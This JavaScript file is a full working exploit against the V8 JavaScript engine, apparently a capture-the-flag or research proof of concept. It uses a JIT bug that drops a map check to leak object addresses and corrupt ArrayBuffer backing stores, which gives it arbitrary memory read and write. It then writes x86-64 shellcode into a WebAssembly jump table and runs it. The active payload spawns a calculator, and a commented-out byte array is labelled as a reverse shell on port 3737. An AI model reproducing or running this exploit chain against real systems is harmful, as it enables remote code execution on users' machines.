/* ======================== START UTILITY =========================== */
// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have exactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function UnTag(addr) {
    if (parseInt(addr.toString()) & 1) {
        addr = Sub(addr, 1);
    }
    return addr;
}

/// We need to manually trigger GC at a few points to move objects whose
/// address we are going to leak to their final location on Old Space.
function gc() {
    var i = 0;
    for (var i = 0; i < 10000; i++) {
        // Random code to trick the optimizer...
        var a = [1,2,i,3,4];
        i += a.sort()[0];
    }
}

var obj_buf = new ArrayBuffer(1024);
obj_buf.offset0 = {};
obj_buf.offset8 = {};
obj_buf.offset16 = {};
var memview_buf = new ArrayBuffer(1024);
gc();

var victim = {inline: 42};
// Force out of line storage
victim.offset0 = {}
victim.offset8 = {}
victim.offset16 = {}

/* ========= BEGIN Vulnerable Function ========= */
// Both function can only be used once, because map is changed permanently
// Require recompilation

// Vulnerable function for read
function foo(o, cb) {
    // Generate first MapCheck
    var a = o.a;
    // This callback could change the Map ...
    cb(a);
    // ... but this MapCheck will still be removed ¯\_(ツ)_/¯
    return o.b;
}

// Vulnerable function for write
function bar(o, cb, dval) {
    // Generate first MapCheck
    var a = o.c;
    // Overwrite HeapNumber with JSObject
    cb(a);
    // Change js object property field
    o.d = dval;
    return o.d;
}

/* ========== BEGIN One Time Primitives =========== */
function addr(target) {
    var o = {a: 0.1, b: 0.2};
    // Force JIT compilation...
    for (var i = 0; i < 100000; i++) {
        foo(o, function(a) { return a + 1; });
    }

    var r = foo(o, function(a) { o.b = target; });
    return Int64.fromDouble(r);
}

function corrupt_properties(target, value) {
    var dval = value.asDouble();
    // Avoid having the same map as foo, maybe not needed
    var o = {c: 1}
    // Out of line property, stored as heap number
    o.d = 0.7;
    // Force JIT compilation...
    for (var i = 0; i < 100000; i++) {
        bar(o, function(a) { return a + i; }, dval);
    }
    
    bar(o, function(a) { o.d = target; }, dval); 
}

var obj_buf_addr = addr(obj_buf);
console.log("[+] obj_buf at " + obj_buf_addr.toString());
corrupt_properties(victim, obj_buf_addr);
// offset16 is arraybuffer's backing store
victim.offset16 = memview_buf;

var driver = new Uint8Array(obj_buf);

/* ========== BEGIN Primitive Functions =========== */
// Until this point, we have an Arraybuffer with the backing store pointing to another arraybuffer
// So we can easily gain read/write, by writing over the backing store of the second array buffer
function read(addr, len) {
    // Off by one here instead of 32, because of pointer tagging...
    // We are treating memview_buf's tagged pointer as a raw pointer
    driver.set(addr.bytes(), 31);
    var memview = new Uint8Array(memview_buf, 0, len);
    var res = Array.from(memview);
    return res;
}

function read64(addr) {

    return UnTag(new Int64(read(addr, 8)))
}

function addrof(obj) {
    // I'm going to use elements...since property has some weird issure
    // with const data descriptor
    obj_buf[0] = obj;
    var elements = read64(Add(obj_buf_addr, 15));
    //console.log("[DEBUG] elements is at " + elements.toString());
    var addr = read64(Add(elements, 16));
    return addr
}

function write(addr, data) {
    driver.set(addr.bytes(), 31);
    var memview = new Uint8Array(memview_buf);
    memview.set(data);
}

/* ========== BEGIN Exploiting =========== */
// We can't overwrite code, because of compilation flag
// write_protect_code_memory, which defaults to true
// however wasm_write_protect_code_memory is false by default
// WASM Functions

function utf8ToString(h, p) {
  let s = "";
  for (i = p; h[i]; i++) {
    s += String.fromCharCode(h[i]);
  }
  return s;
}

function test() {
  var wasmImports = {
    env: {
      puts: function puts (index) {
        print(utf8ToString(h, index));
      }
    }
  };
  var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
    96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
    116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
    131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
    109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
    128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
    65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
  let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
  let h = new Uint8Array(m.exports.memory.buffer);
  return m.exports.hello;
}

global_test = test();
let f_addr = addrof(global_test);
console.log("[+] found JSFunction at " + f_addr.toString());

// TODO: This is not portable
let WasmOffsets = {
    shared_function_info : 3 * 8,
    wasm_exported_function_data : 1 * 8,
    wasm_instance : 2 * 8,
    jump_table_start : 29 * 8
}

/*
// reverse shell at 3737
let shellcode = [0x6a, 0x29, 0x58, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x99, 0x0f, 0x05, 0x52, 0xba, 0x01, 0x01, 0x01, 0x01, 0x81, 0xf2, 0x03, 0x01, 0x0f, 0x98, 0x52, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xc5, 0x48, 0x89, 0xc7, 0x6a, 0x31, 0x58, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x6a, 0x32, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x6a, 0x2b, 0x58, 0x48, 0x89, 0xef, 0x31, 0xf6, 0x99, 0x0f, 0x05, 0x48, 0x89, 0xc5, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x78, 0x0b, 0x56, 0x6a, 0x21, 0x58, 0x48, 0x89, 0xef, 0x0f, 0x05, 0xeb, 0xef, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e, 0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05]
*/
// spawn gnome calculator
let shellcode = [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xeb, 0xfe, 0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00];


let sf_info_addr = read64(Add(f_addr, WasmOffsets['shared_function_info']));
console.log("[+] found SharedFunctionInfo at " + sf_info_addr.toString());
let wasm_ef_data_addr = read64(Add(sf_info_addr, WasmOffsets['wasm_exported_function_data']));
console.log("[+] found WasmExportedFunctionData at " + wasm_ef_data_addr.toString());
let wasm_instance_addr = read64(Add(wasm_ef_data_addr, WasmOffsets['wasm_instance']));
console.log("[+] found WasmInstance at " + wasm_instance_addr.toString());
let wasm_jump_table_addr = read64(Add(wasm_instance_addr, WasmOffsets['jump_table_start']));
console.log("[+] found JumpTableStart at " + wasm_jump_table_addr.toString());
console.log("[+] writting shellcode ...");
write(wasm_jump_table_addr, shellcode);
console.log("[+] Pwned! Reverse shell at port 3737");
global_test();
/*
while(1) {
}
*/
